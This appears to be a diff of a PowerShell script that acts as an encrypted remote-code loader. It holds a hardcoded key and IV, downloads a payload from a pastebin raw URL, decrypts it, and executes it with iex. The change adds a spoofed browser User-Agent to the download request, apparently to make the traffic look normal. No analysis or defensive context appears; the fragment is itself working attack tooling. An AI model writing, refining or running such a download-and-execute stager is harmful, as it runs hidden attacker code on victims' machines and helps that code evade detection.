@@ -17,7 +17,8 @@ $k = [Convert]::FromBase64String("Q3K1OxDixc03IRcJusRx7mbJX15GuNORMw2PuFevUfA=")
 $i = [Convert]::FromBase64String("kXHMQaoW9ayabOL5BKBI3w==")
 
 try {
-    $raw = iwr "https://pastebin.com/raw/nA98KEqw" -UseBasicParsing
+    $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+    $raw = Invoke-WebRequest -Uri "https://pastebin.com/raw/nA98KEqw" -UseBasicParsing -Headers $headers
     $p = $raw.Content -replace '[^a-zA-Z0-9+/=]', ''
     iex (D $p $k $i)
 } catch {
